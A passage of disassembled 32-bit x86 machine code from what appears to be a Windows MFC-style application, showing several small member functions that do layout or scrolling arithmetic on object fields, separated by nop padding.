  4056f0:	8b 5c 24 68          	mov    0x68(%esp),%ebx
  4056f4:	53                   	push   %ebx
  4056f5:	8b 5c 24 68          	mov    0x68(%esp),%ebx
  4056f9:	53                   	push   %ebx
  4056fa:	50                   	push   %eax
  4056fb:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  405702:	51                   	push   %ecx
  405703:	52                   	push   %edx
  405704:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  405708:	52                   	push   %edx
  405709:	55                   	push   %ebp
  40570a:	50                   	push   %eax
  40570b:	ff 15 5c 50 41 00    	call   *0x41505c
  405711:	8b 4e 60             	mov    0x60(%esi),%ecx
  405714:	8b 46 68             	mov    0x68(%esi),%eax
  405717:	03 c8                	add    %eax,%ecx
  405719:	8b 46 74             	mov    0x74(%esi),%eax
  40571c:	03 e9                	add    %ecx,%ebp
  40571e:	47                   	inc    %edi
  40571f:	3b f8                	cmp    %eax,%edi
  405721:	75 38                	jne    0x40575b
  405723:	8b 4e 70             	mov    0x70(%esi),%ecx
  405726:	83 f9 01             	cmp    $0x1,%ecx
  405729:	74 45                	je     0x405770
  40572b:	3b f8                	cmp    %eax,%edi
  40572d:	75 2c                	jne    0x40575b
  40572f:	8b c1                	mov    %ecx,%eax
  405731:	83 f8 01             	cmp    $0x1,%eax
  405734:	7e 25                	jle    0x40575b
  405736:	39 44 24 10          	cmp    %eax,0x10(%esp)
  40573a:	74 34                	je     0x405770
  40573c:	8b 56 64             	mov    0x64(%esi),%edx
  40573f:	8b 5e 6c             	mov    0x6c(%esi),%ebx
  405742:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  405746:	8b 44 24 10          	mov    0x10(%esp),%eax
  40574a:	03 d3                	add    %ebx,%edx
  40574c:	33 ff                	xor    %edi,%edi
  40574e:	33 ed                	xor    %ebp,%ebp
  405750:	03 ca                	add    %edx,%ecx
  405752:	40                   	inc    %eax
  405753:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  405757:	89 44 24 10          	mov    %eax,0x10(%esp)
  40575b:	8b 44 24 18          	mov    0x18(%esp),%eax
  40575f:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  405763:	40                   	inc    %eax
  405764:	3b c1                	cmp    %ecx,%eax
  405766:	89 44 24 18          	mov    %eax,0x18(%esp)
  40576a:	0f 8c 42 ff ff ff    	jl     0x4056b2
  405770:	8b 44 24 38          	mov    0x38(%esp),%eax
  405774:	5f                   	pop    %edi
  405775:	85 c0                	test   %eax,%eax
  405777:	74 03                	je     0x40577c
  405779:	8b 40 04             	mov    0x4(%eax),%eax
  40577c:	50                   	push   %eax
  40577d:	8b 44 24 24          	mov    0x24(%esp),%eax
  405781:	50                   	push   %eax
  405782:	e8 c1 d6 00 00       	call   0x412e48
  405787:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  40578b:	e8 b2 d6 00 00       	call   0x412e42
  405790:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  405794:	8b 35 60 50 41 00    	mov    0x415060,%esi
  40579a:	51                   	push   %ecx
  40579b:	ff d6                	call   *%esi
  40579d:	8b 54 24 30          	mov    0x30(%esp),%edx
  4057a1:	52                   	push   %edx
  4057a2:	ff d6                	call   *%esi
  4057a4:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4057a8:	c6 84 24 d8 00 00 00 	movb   $0x0,0xd8(%esp)
  4057af:	00 
  4057b0:	e8 87 d6 00 00       	call   0x412e3c
  4057b5:	8d 4c 24 7c          	lea    0x7c(%esp),%ecx
  4057b9:	c7 84 24 d8 00 00 00 	movl   $0xffffffff,0xd8(%esp)
  4057c0:	ff ff ff ff 
  4057c4:	e8 ef d5 00 00       	call   0x412db8
  4057c9:	8b 8c 24 d0 00 00 00 	mov    0xd0(%esp),%ecx
  4057d0:	5e                   	pop    %esi
  4057d1:	5d                   	pop    %ebp
  4057d2:	5b                   	pop    %ebx
  4057d3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4057da:	81 c4 d0 00 00 00    	add    $0xd0,%esp
  4057e0:	c3                   	ret
  4057e1:	90                   	nop
  4057e2:	90                   	nop
  4057e3:	90                   	nop
  4057e4:	90                   	nop
  4057e5:	90                   	nop
  4057e6:	90                   	nop
  4057e7:	90                   	nop
  4057e8:	90                   	nop
  4057e9:	90                   	nop
  4057ea:	90                   	nop
  4057eb:	90                   	nop
  4057ec:	90                   	nop
  4057ed:	90                   	nop
  4057ee:	90                   	nop
  4057ef:	90                   	nop
  4057f0:	33 c0                	xor    %eax,%eax
  4057f2:	c2 04 00             	ret    $0x4
  4057f5:	90                   	nop
  4057f6:	90                   	nop
  4057f7:	90                   	nop
  4057f8:	90                   	nop
  4057f9:	90                   	nop
  4057fa:	90                   	nop
  4057fb:	90                   	nop
  4057fc:	90                   	nop
  4057fd:	90                   	nop
  4057fe:	90                   	nop
  4057ff:	90                   	nop
  405800:	8b 44 24 04          	mov    0x4(%esp),%eax
  405804:	85 c0                	test   %eax,%eax
  405806:	75 0c                	jne    0x405814
  405808:	8b 41 44             	mov    0x44(%ecx),%eax
  40580b:	8b 50 f8             	mov    -0x8(%eax),%edx
  40580e:	89 51 74             	mov    %edx,0x74(%ecx)
  405811:	c2 04 00             	ret    $0x4
  405814:	89 41 74             	mov    %eax,0x74(%ecx)
  405817:	c2 04 00             	ret    $0x4
  40581a:	90                   	nop
  40581b:	90                   	nop
  40581c:	90                   	nop
  40581d:	90                   	nop
  40581e:	90                   	nop
  40581f:	90                   	nop
  405820:	56                   	push   %esi
  405821:	57                   	push   %edi
  405822:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  405826:	85 ff                	test   %edi,%edi
  405828:	75 22                	jne    0x40584c
  40582a:	8b 71 74             	mov    0x74(%ecx),%esi
  40582d:	85 f6                	test   %esi,%esi
  40582f:	74 14                	je     0x405845
  405831:	8b 41 44             	mov    0x44(%ecx),%eax
  405834:	8b 40 f8             	mov    -0x8(%eax),%eax
  405837:	99                   	cltd
  405838:	f7 fe                	idiv   %esi
  40583a:	89 41 70             	mov    %eax,0x70(%ecx)
  40583d:	89 79 70             	mov    %edi,0x70(%ecx)
  405840:	5f                   	pop    %edi
  405841:	5e                   	pop    %esi
  405842:	c2 04 00             	ret    $0x4
  405845:	c7 41 70 01 00 00 00 	movl   $0x1,0x70(%ecx)
  40584c:	89 79 70             	mov    %edi,0x70(%ecx)
  40584f:	5f                   	pop    %edi
  405850:	5e                   	pop    %esi
  405851:	c2 04 00             	ret    $0x4
  405854:	90                   	nop
  405855:	90                   	nop
  405856:	90                   	nop
  405857:	90                   	nop
  405858:	90                   	nop
  405859:	90                   	nop
  40585a:	90                   	nop
  40585b:	90                   	nop
  40585c:	90                   	nop
  40585d:	90                   	nop
  40585e:	90                   	nop
  40585f:	90                   	nop
  405860:	83 ec 10             	sub    $0x10,%esp
  405863:	56                   	push   %esi
  405864:	8b f1                	mov    %ecx,%esi
  405866:	57                   	push   %edi
  405867:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  40586b:	8b 46 74             	mov    0x74(%esi),%eax
  40586e:	85 c0                	test   %eax,%eax
  405870:	75 03                	jne    0x405875
  405872:	89 7e 74             	mov    %edi,0x74(%esi)
  405875:	8b 4e 20             	mov    0x20(%esi),%ecx
  405878:	8d 44 24 08          	lea    0x8(%esp),%eax
  40587c:	50                   	push   %eax
  40587d:	51                   	push   %ecx
  40587e:	ff 15 5c 56 41 00    	call   *0x41565c
  405884:	8b 54 24 14          	mov    0x14(%esp),%edx
  405888:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40588c:	8b 46 68             	mov    0x68(%esi),%eax
  40588f:	2b d1                	sub    %ecx,%edx
  405891:	8b 4e 60             	mov    0x60(%esi),%ecx
  405894:	6a 02                	push   $0x2
  405896:	03 c1                	add    %ecx,%eax
  405898:	52                   	push   %edx
  405899:	0f af c7             	imul   %edi,%eax
  40589c:	50                   	push   %eax
  40589d:	6a 00                	push   $0x0
  40589f:	6a 00                	push   $0x0
  4058a1:	6a 00                	push   $0x0
  4058a3:	8b ce                	mov    %esi,%ecx
  4058a5:	e8 b6 d5 00 00       	call   0x412e60
  4058aa:	5f                   	pop    %edi
  4058ab:	5e                   	pop    %esi
  4058ac:	83 c4 10             	add    $0x10,%esp
  4058af:	c2 04 00             	ret    $0x4
  4058b2:	90                   	nop
  4058b3:	90                   	nop
  4058b4:	90                   	nop
  4058b5:	90                   	nop
  4058b6:	90                   	nop
  4058b7:	90                   	nop
  4058b8:	90                   	nop
  4058b9:	90                   	nop
  4058ba:	90                   	nop
  4058bb:	90                   	nop
  4058bc:	90                   	nop
  4058bd:	90                   	nop
  4058be:	90                   	nop
  4058bf:	90                   	nop
  4058c0:	83 ec 10             	sub    $0x10,%esp
  4058c3:	56                   	push   %esi
  4058c4:	8b f1                	mov    %ecx,%esi
  4058c6:	57                   	push   %edi
  4058c7:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  4058cb:	8b 46 70             	mov    0x70(%esi),%eax
  4058ce:	85 c0                	test   %eax,%eax
  4058d0:	75 03                	jne    0x4058d5
  4058d2:	89 7e 70             	mov    %edi,0x70(%esi)
  4058d5:	8b 4e 20             	mov    0x20(%esi),%ecx
  4058d8:	8d 44 24 08          	lea    0x8(%esp),%eax
  4058dc:	50                   	push   %eax
  4058dd:	51                   	push   %ecx
  4058de:	ff 15 5c 56 41 00    	call   *0x41565c
  4058e4:	8b 56 6c             	mov    0x6c(%esi),%edx
  4058e7:	8b 46 64             	mov    0x64(%esi),%eax
  4058ea:	03 d0                	add    %eax,%edx
  4058ec:	8b 44 24 10          	mov    0x10(%esp),%eax
  4058f0:	0f af d7             	imul   %edi,%edx
  4058f3:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4058f7:	6a 02                	push   $0x2
  4058f9:	2b c1                	sub    %ecx,%eax
  4058fb:	52                   	push   %edx
  4058fc:	50                   	push   %eax
  4058fd:	6a 00                	push   $0x0
  4058ff:	6a 00                	push   $0x0
  405901:	6a 00                	push   $0x0
  405903:	8b ce                	mov    %esi,%ecx
